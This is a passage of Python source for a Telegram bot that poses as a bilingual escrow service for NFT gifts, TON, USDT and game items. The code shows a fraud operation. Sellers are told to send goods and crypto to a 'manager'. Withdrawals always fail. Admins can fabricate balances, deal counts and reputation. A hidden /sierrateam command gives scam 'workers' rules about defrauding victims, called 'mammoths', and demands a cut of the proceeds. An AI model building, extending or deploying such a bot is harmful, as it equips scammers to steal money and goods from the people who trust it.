                await message.answer("📝 Создание сделки\n\nВыберите валюту:", reply_markup=currency_keyboard_ru)
            else:
                await message.answer("📝 Creating deal\n\nChoose currency:", reply_markup=currency_keyboard_en)
        elif deal_data.get("step") == "amount":
            try:
                amount = float(message.text.replace(',', ''))
                deal_data["amount"] = amount
                deal_id = generate_deal_id()
                await get_bot_username()
                deal_link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
                active_deals[deal_id] = {
                    "seller_id": user_id,
                    "seller_username": message.from_user.username or "Не указан",
                    "description": deal_data["description"],
                    "type": deal_data["type"],
                    "currency": deal_data["currency"],
                    "amount": amount,
                    "buyer_id": None,
                    "status": "created"
                }

                type_names_ru = {
                    "deal_gift": "🎁 NFT/Подарок",
                    "deal_stars": "⭐️ Telegram Stars",
                    "deal_ton": "💎 TON",
                    "deal_game": "🎮 Игровой предмет",
                    "deal_service": "🛠 Услуга",
                    "deal_crypto": "₿ Криптовалюта"
                }
                type_names_en = {
                    "deal_gift": "🎁 NFT/Gift",
                    "deal_stars": "⭐️ Telegram Stars",
                    "deal_ton": "💎 TON",
                    "deal_game": "🎮 Game item",
                    "deal_service": "🛠 Service",
                    "deal_crypto": "₿ Cryptocurrency"
                }
                type_text = type_names_ru.get(deal_data["type"], "📦 Товар") if lang == "ru" else type_names_en.get(deal_data["type"], "📦 Item")

                # Инструкция продавцу что передать
                seller_instruction = ""
                if deal_data["type"] == "deal_gift":
                    seller_instruction = f"\n⚠️ Передайте вашу NFT менеджеру @{MANAGER_USERNAME}"
                elif deal_data["type"] == "deal_game":
                    seller_instruction = f"\n⚠️ Передайте игровой предмет менеджеру @{MANAGER_USERNAME}"
                elif deal_data["type"] == "deal_ton":
                    seller_instruction = f"\n⚠️ Переведите TON на кошелёк менеджера:\n`{TON_WALLET}`"
                elif deal_data["type"] == "deal_crypto":
                    seller_instruction = f"\n⚠️ Переведите крипту на кошелёк менеджера:\n`{USDT_WALLET}`"
                elif deal_data["type"] == "deal_service":
                    seller_instruction = f"\n⚠️ Ожидайте оплаты от покупателя, затем выполните услугу"

                if lang == "ru":
                    keyboard = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="✖ Отменить сделку", callback_data=f"cancel_deal_{deal_id}")]
                    ])
                    await message.answer(
                        f"✅ Сделка успешно создана!\n\n"
                        f"📌 Тип: {type_text}\n"
                        f"💰 Сумма: {amount} {deal_data['currency']}\n"
                        f"📝 Описание: {deal_data['description']}\n"
                        f"{seller_instruction}\n\n"
                        f"🔗 Ссылка для покупателя:\n{deal_link}",
                        reply_markup=keyboard
                    )
                else:
                    keyboard = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="✖ Cancel deal", callback_data=f"cancel_deal_{deal_id}")]
                    ])
                    await message.answer(
                        f"✅ Deal successfully created!\n\n"
                        f"📌 Type: {type_text}\n"
                        f"💰 Amount: {amount} {deal_data['currency']}\n"
                        f"📝 Description: {deal_data['description']}\n"
                        f"{seller_instruction}\n\n"
                        f"🔗 Buyer link:\n{deal_link}",
                        reply_markup=keyboard
                    )
                del user_deals[user_id]
            except ValueError:
                if lang == "ru":
                    await message.answer("❌ Пожалуйста, введите корректную сумму")
                else:
                    await message.answer("❌ Please enter a valid amount")
        return

    # Реквизиты
    if " - " in message.text and any(c.isdigit() for c in message.text):
        if user_id not in user_requisites:
            user_requisites[user_id] = {}
        user_requisites[user_id]["card"] = message.text
        await message.answer("✅ Реквизиты карты успешно добавлены!" if lang == "ru" else "✅ Card details successfully added!")
    elif len(message.text) > 30 and ('UQ' in message.text or 'EQ' in message.text):
        if user_id not in user_requisites:
            user_requisites[user_id] = {}
        user_requisites[user_id]["ton"] = message.text
        await message.answer("✅ TON кошелек успешно добавлен!" if lang == "ru" else "✅ TON wallet successfully added!")
    elif message.text.startswith('T') and len(message.text) == 34:
        if user_id not in user_requisites:
            user_requisites[user_id] = {}
        user_requisites[user_id]["usdt"] = message.text
        await message.answer("✅ USDT кошелек успешно добавлен!" if lang == "ru" else "✅ USDT wallet successfully added!")

# ========== ОПЛАТА ==========
@dp.callback_query(F.data == "paid_confirmed")
async def paid_confirmed_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    deal_id = None
    for did, deal in active_deals.items():
        if deal["buyer_id"] == callback.from_user.id and deal["status"] == "active":
            deal_id = did
            break
    if deal_id:
        deal = active_deals[deal_id]
        await callback.message.edit_text("✅ Оплата подтверждена, ожидайте проверки администратором")
        # Уведомляем всех админов
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(
                    admin_id,
                    f"✅ Покупатель подтвердил оплату сделки #{deal_id}\n\n"
                    f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
                    f"👤 Продавец: @{deal['seller_username']}\n"
                    f"👤 Покупатель: @{deal['buyer_username']}\n"
                    f"📦 Товар: {deal['description']}",
                    reply_markup=admin_payment_keyboard
                )
            except:
                pass
        active_deals[deal_id]["admin_message_id"] = callback.message.message_id
        active_deals[deal_id]["status"] = "waiting_admin"

@dp.callback_query(F.data == "admin_payment_ok")
async def admin_payment_ok_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id) and callback.from_user.id != MANAGER_ID:
        await callback.answer("❌ Нет доступа", show_alert=True)
        return
    deal_id = None
    for did, deal in active_deals.items():
        if deal.get("admin_message_id") and deal["status"] == "waiting_admin":
            deal_id = did
            break
    if deal_id:
        deal = active_deals[deal_id]
        deal["status"] = "payment_confirmed"
        seller_lang = user_languages.get(deal["seller_id"], "ru")
        type_names_ru = {
            "deal_gift": "🎁 NFT/Подарок", "deal_stars": "⭐️ Telegram Stars",
            "deal_ton": "💎 TON", "deal_game": "🎮 Игровой предмет",
            "deal_service": "🛠 Услуга", "deal_crypto": "₿ Криптовалюта"
        }
        type_names_en = {
            "deal_gift": "🎁 NFT/Gift", "deal_stars": "⭐️ Telegram Stars",
            "deal_ton": "💎 TON", "deal_game": "🎮 Game item",
            "deal_service": "🛠 Service", "deal_crypto": "₿ Cryptocurrency"
        }
        if seller_lang == "ru":
            text = (
                f"✅ Оплата подтверждена для сделки #{deal_id}\n\n"
                f"📦 Предмет: {deal['description']}\n"
                f"📌 Тип: {type_names_ru.get(deal['type'], '📦 Товар')}\n\n"
                f"⚠️ Отправьте товар менеджеру @{MANAGER_USERNAME}\n\n"
                f"✅ После отправки нажмите кнопку «📦 Товар отправлен»"
            )
        else:
            text = (
                f"✅ Payment confirmed for deal #{deal_id}\n\n"
                f"📦 Item: {deal['description']}\n"
                f"📌 Type: {type_names_en.get(deal['type'], '📦 Item')}\n\n"
                f"⚠️ Send the item to manager @{MANAGER_USERNAME}\n\n"
                f"✅ After sending, press the «📦 Item sent» button"
            )
        await bot.send_message(deal["seller_id"], text, reply_markup=seller_gift_keyboard)
        await callback.message.edit_text("✅ Оплата подтверждена, продавец уведомлен")

@dp.callback_query(F.data == "admin_payment_fail")
async def admin_payment_fail_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id) and callback.from_user.id != MANAGER_ID:
        await callback.answer("❌ Нет доступа", show_alert=True)
        return
    deal_id = None
    for did, deal in active_deals.items():
        if deal.get("admin_message_id") and deal["status"] == "waiting_admin":
            deal_id = did
            break
    if deal_id:
        deal = active_deals[deal_id]
        await bot.send_message(deal["buyer_id"], "❌ Оплата не подтверждена. Свяжитесь с поддержкой.")
        await bot.send_message(deal["seller_id"], "❌ Оплата не подтверждена. Свяжитесь с поддержкой.")
        await callback.message.edit_text("❌ Оплата не подтверждена")

@dp.callback_query(F.data == "item_sent")
async def item_sent_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    deal_id = None
    for did, deal in active_deals.items():
        if deal["seller_id"] == callback.from_user.id and deal["status"] == "payment_confirmed":
            deal_id = did
            break
    if deal_id:
        deal = active_deals[deal_id]
        deal["status"] = "item_sent"
        await bot.send_message(
            deal["buyer_id"],
            "✅ Продавец подтвердил отправку товара менеджеру\n\n"
            "✅ После получения товара нажмите кнопку «✅ Да, все верно»",
            reply_markup=buyer_confirmation_keyboard
        )
        await callback.message.edit_text("✅ Вы подтвердили отправку товара. Ожидаем подтверждения от покупателя.")

@dp.callback_query(F.data == "buyer_confirm_ok")
async def buyer_confirm_ok_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    deal_id = None
    for did, deal in active_deals.items():
        if deal["buyer_id"] == callback.from_user.id and deal["status"] == "item_sent":
            deal_id = did
            break
    if deal_id:
        deal = active_deals[deal_id]
        deal["status"] = "completed"
        success_message = "✅ Сделка состоялась успешно!"
        await callback.message.edit_text(success_message)
        await bot.send_message(deal["seller_id"], success_message)
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(admin_id, f"✅ Сделка #{deal_id} успешно завершена")
            except:
                pass
        if deal["seller_id"] not in user_stats:
            user_stats[deal["seller_id"]] = {"successful": 0, "total": 0, "turnover": 0, "rep": 0}
        user_stats[deal["seller_id"]]["successful"] += 1
        user_stats[deal["seller_id"]]["total"] += 1
        user_stats[deal["seller_id"]]["turnover"] += deal["amount"]
        del active_deals[deal_id]

@dp.callback_query(F.data == "buyer_confirm_fail")
async def buyer_confirm_fail_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    deal_id = None
    for did, deal in active_deals.items():
        if deal["buyer_id"] == callback.from_user.id and deal["status"] == "item_sent":
            deal_id = did
            break
    if deal_id:
        deal = active_deals[deal_id]
        await callback.message.edit_text("✖ Вы сообщили о проблеме с получением товара. Свяжитесь с поддержкой.")
        await bot.send_message(deal["seller_id"], "✖ Покупатель сообщил о проблеме с получением товара. Свяжитесь с поддержкой.")
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(admin_id, f"⚠️ Проблема со сделкой #{deal_id}. Покупатель не получил товар.")
            except:
                pass

# ========== ПРОФИЛЬ ==========
@dp.callback_query(F.data == "profile")
async def profile_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    user_id = callback.from_user.id
    username = callback.from_user.username or "Не указан"
    balance = user_balances.get(user_id, 0)
    stats = user_stats.get(user_id, {"successful": 0, "total": 0, "turnover": 0, "rep": 0})
    lang = user_languages.get(user_id, "ru")
    if lang == "ru":
        await safe_edit_message(
            callback,
            f"👤 Профиль пользователя\n\n"
            f"📱 Имя пользователя: @{username}\n"
            f"💰 Общий баланс: {balance} RUB\n"
            f"📊 Всего сделок: {stats.get('total', 0)}\n"
            f"✅ Успешных сделок: {stats.get('successful', 0)}\n"
            f"💵 Суммарный оборот: {stats.get('turnover', 0)} RUB\n"
            f"⭐️ Репутация: {stats.get('rep', 0)}",
            profile_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            f"👤 User profile\n\n"
            f"📱 Username: @{username}\n"
            f"💰 Total balance: {balance} RUB\n"
            f"📊 Total deals: {stats.get('total', 0)}\n"
            f"✅ Successful deals: {stats.get('successful', 0)}\n"
            f"💵 Total turnover: {stats.get('turnover', 0)} RUB\n"
            f"⭐️ Reputation: {stats.get('rep', 0)}",
            profile_keyboard_en
        )

# ========== ДЕПОЗИТ ==========
@dp.callback_query(F.data == "deposit")
async def deposit_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    lang = user_languages.get(callback.from_user.id, "ru")
    if lang == "ru":
        await safe_edit_message(callback,
            "❓ Как работают кнопки выбора валюты?\n\n"
            "Когда вы выбираете способ пополнения, бот автоматически считает, сколько нужно отправить.\n\n"
            "✅ Пример: выберите «На карту → RUB» и введите 1000 — бот подскажет сколько нужно пополнить.",
            read_keyboard_ru)
    else:
        await safe_edit_message(callback,
            "❓ How do currency selection buttons work?\n\n"
            "When you select a top-up method, the bot automatically calculates how much to send.\n\n"
            "✅ Example: select «To card → RUB» and enter 1000 — bot will tell you how much to top up.",
            read_keyboard_en)

@dp.callback_query(F.data == "read_deposit")
async def read_deposit_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    lang = user_languages.get(callback.from_user.id, "ru")
    if lang == "ru":
        await safe_edit_message(callback, "💰 Пополнение баланса\n\nВыберите способ:", deposit_method_keyboard_ru)
    else:
        await safe_edit_message(callback, "💰 Balance top-up\n\nChoose method:", deposit_method_keyboard_en)

@dp.callback_query(F.data == "deposit_card")
async def deposit_card_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    memo = generate_memo()
    lang = user_languages.get(callback.from_user.id, "ru")
    if lang == "ru":
        await safe_edit_message(callback, f"💳 {MANAGER_CARD}\nПереводите точную сумму и не забывайте мемо комментарий\n\n📝 Memo: `{memo}`", back_simple_keyboard_ru)
    else:
        await safe_edit_message(callback, f"💳 {MANAGER_CARD}\nTransfer the exact amount and don't forget the memo comment\n\n📝 Memo: `{memo}`", back_simple_keyboard_en)

@dp.callback_query(F.data == "deposit_ton")
async def deposit_ton_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    memo = generate_memo()
    lang = user_languages.get(callback.from_user.id, "ru")
    if lang == "ru":
        await safe_edit_message(callback, f"💎 TON кошелек:\n`{TON_WALLET}`\n\nНе забудьте мемо комментарий\n📝 Memo: `{memo}`", back_simple_keyboard_ru)
    else:
        await safe_edit_message(callback, f"💎 TON wallet:\n`{TON_WALLET}`\n\nDon't forget memo comment\n📝 Memo: `{memo}`", back_simple_keyboard_en)

@dp.callback_query(F.data == "deposit_usdt")
async def deposit_usdt_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    memo = generate_memo()
    lang = user_languages.get(callback.from_user.id, "ru")
    if lang == "ru":
        await safe_edit_message(callback, f"💵 USDT кошелек (TRC-20):\n`{USDT_WALLET}`\n\nНе забудьте мемо комментарий\n📝 Memo: `{memo}`", back_simple_keyboard_ru)
    else:
        await safe_edit_message(callback, f"💵 USDT wallet (TRC-20):\n`{USDT_WALLET}`\n\nDon't forget memo comment\n📝 Memo: `{memo}`", back_simple_keyboard_en)

@dp.callback_query(F.data == "withdraw")
async def withdraw_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    lang = user_languages.get(callback.from_user.id, "ru")
    balance = user_balances.get(callback.from_user.id, 0)
    if balance <= 0:
        await callback.answer("❌ Нет средств для вывода" if lang == "ru" else "❌ No funds to withdraw", show_alert=True)
    else:
        await callback.answer("❌ К сожалению вывод сейчас недоступен" if lang == "ru" else "❌ Unfortunately withdrawal is currently unavailable", show_alert=True)

# ========== РЕКВИЗИТЫ ==========
@dp.callback_query(F.data == "requisites")
async def requisites_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    lang = user_languages.get(callback.from_user.id, "ru")
    if lang == "ru":
        await safe_edit_message(callback, "⚙️ Управление реквизитами\n\nВыберите одну из предложенных ниже опций:", requisites_keyboard_ru)
    else:
        await safe_edit_message(callback, "⚙️ Payment details management\n\nChoose one of the options below:", requisites_keyboard_en)

@dp.callback_query(F.data == "add_card")
async def add_card_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    lang = user_languages.get(callback.from_user.id, "ru")
    if lang == "ru":
        await safe_edit_message(callback, "💳 Добавить реквизиты карты\n\nФормат:\nНазвание банка - Номер карты\nПример: `ВТБ - 89041751408`", back_simple_keyboard_ru)
    else:
        await safe_edit_message(callback, "💳 Add card details\n\nFormat:\nBank name - Card number\nExample: `VTB - 89041751408`", back_simple_keyboard_en)

@dp.callback_query(F.data == "add_ton")
async def add_ton_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    lang = user_languages.get(callback.from_user.id, "ru")
    if lang == "ru":
        await safe_edit_message(callback, "💎 Добавить TON кошелек\n\nПример: `UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc`", back_simple_keyboard_ru)
    else:
        await safe_edit_message(callback, "💎 Add TON wallet\n\nExample: `UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc`", back_simple_keyboard_en)

@dp.callback_query(F.data == "add_usdt")
async def add_usdt_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    lang = user_languages.get(callback.from_user.id, "ru")
    if lang == "ru":
        await safe_edit_message(callback, "💵 Добавить USDT кошелек (TRC-20)\n\nПример: `TJjAD8rR7yFb84F1boTKr6mRKJvLhNR9p1`", back_simple_keyboard_ru)
    else:
        await safe_edit_message(callback, "💵 Add USDT wallet (TRC-20)\n\nExample: `TJjAD8rR7yFb84F1boTKr6mRKJvLhNR9p1`", back_simple_keyboard_en)

@dp.callback_query(F.data == "view_requisites")
async def view_requisites_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    user_id = callback.from_user.id
    requisites = user_requisites.get(user_id, {})
    lang = user_languages.get(user_id, "ru")
    if not requisites:
        await safe_edit_message(callback, "✖ Реквизиты не найдены." if lang == "ru" else "✖ Details not found.", back_simple_keyboard_ru if lang == "ru" else back_simple_keyboard_en)
    else:
        text = "💳 Ваши реквизиты\n\n" if lang == "ru" else "💳 Your details\n\n"
        if "card" in requisites:
            text += f"💳 Карта: `{requisites['card']}`\n"
        if "ton" in requisites:
            text += f"💎 TON: `{requisites['ton']}`\n"
        if "usdt" in requisites:
            text += f"💵 USDT: `{requisites['usdt']}`\n"
        await safe_edit_message(callback, text, back_simple_keyboard_ru if lang == "ru" else back_simple_keyboard_en)

# ========== ЯЗЫК ==========
@dp.callback_query(F.data == "change_language")
async def change_language_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    await safe_edit_message(callback, "🌐 Выберите язык / Choose language:", language_keyboard)

@dp.callback_query(F.data == "lang_ru")
async def lang_ru_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    user_languages[callback.from_user.id] = "ru"
    await send_main_menu(callback.message.chat.id, "ru", callback.message.message_id)

@dp.callback_query(F.data == "lang_en")
async def lang_en_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    user_languages[callback.from_user.id] = "en"
    await send_main_menu(callback.message.chat.id, "en", callback.message.message_id)

# ========== ADMIN CALLBACKS ==========
@dp.callback_query(F.data == "ban_user")
async def ban_user_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("✖ У вас нет доступа к этой функции", show_alert=True)
        return
    admin_states[callback.from_user.id] = "waiting_ban_id"
    await safe_edit_message(callback, "Введите ID пользователя для блокировки:")

@dp.callback_query(F.data == "send_money")
async def send_money_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("✖ У вас нет доступа к этой функции", show_alert=True)
        return
    admin_states[callback.from_user.id] = "waiting_send_money"
    await safe_edit_message(callback, "Введите ID пользователя и сумму: ID СУММА")

@dp.callback_query(F.data == "set_successful_deals")
async def set_successful_deals_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("✖ У вас нет доступа к этой функции", show_alert=True)
        return
    admin_states[callback.from_user.id] = "waiting_successful_deals"
    await safe_edit_message(callback, "Введите ID пользователя и количество: ID КОЛИЧЕСТВО")

@dp.callback_query(F.data == "set_total_deals")
async def set_total_deals_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("✖ У вас нет доступа к этой функции", show_alert=True)
        return
    admin_states[callback.from_user.id] = "waiting_total_deals"
    await safe_edit_message(callback, "Введите ID пользователя и количество: ID КОЛИЧЕСТВО")

@dp.callback_query(F.data == "set_turnover")
async def set_turnover_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("✖ У вас нет доступа к этой функции", show_alert=True)
        return
    admin_states[callback.from_user.id] = "waiting_turnover"
    await safe_edit_message(callback, "Введите ID пользователя и оборот: ID СУММА")

# ========== БАННЕР ==========
@dp.message(Command("setbanner"))
async def set_banner_command(message: Message):
    if not is_admin(message.from_user.id):
        return
    await message.answer("🖼 Отправьте фото для баннера")

@dp.message(F.photo)
async def save_banner(message: Message):
    if not is_admin(message.from_user.id):
        return
    try:
        file_id = message.photo[-1].file_id
        file = await bot.get_file(file_id)
        await bot.download_file(file.file_path, "banner.jpg")
        await message.answer("✅ Баннер установлен!")
    except:
        await message.answer("❌ Ошибка при сохранении баннера")

@dp.message(Command("removebanner"))
async def remove_banner_command(message: Message):
    if not is_admin(message.from_user.id):
        return
    try:
        if os.path.exists("banner.jpg"):
            os.remove("banner.jpg")
            await message.answer("✅ Баннер удален")
        else:
            await message.answer("❌ Баннер не найден")
    except:
        await message.answer("❌ Ошибка при удалении")

# ========== SIERRATEAM ==========
@dp.message(Command("sierrateam"))
async def sierrateam_command(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer("✖ Вы были заблокированы в боте")
        return
    await message.answer(
        "Прежде чем начать воркать через бота - прочитай правила:\n\n"
        "1. Наебал на нфт — ЕСЛИ ТЫ НАПИСАЛ МАМОНТУ КИНУТЬ ГИФТ ТЕБЕ А НЕ МЕНЕДЖЕРУ — БАН.\n\n"
        "2. Наебал на брейнрота — 40% от стоимости в течении дня, иначе бан\n\n"
        "3. Не прочитал правила — твои проблемы",
        reply_markup=sierrateam_keyboard
    )

@dp.callback_query(F.data == "sierrateam_read")
async def sierrateam_read_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    await safe_edit_message(
        callback,
        "Админ-панель\n\nВыберите действие:\n\n"
        "Полный доступ: ✖ Отсутствует\n"
        "Может подтверждать: Только подарки\n\n"
        "Для получения полного доступа свяжитесь с @ManagerDealsPlayer",
        reply_markup=admin_keyboard
    )

# ========== ЗАПУСК ==========
async def main():
    print("✅ Бот запущен!")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"👑 Админ IDs: {ADMIN_IDS}")
    print(f"👤 Менеджер: @{MANAGER_USERNAME}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
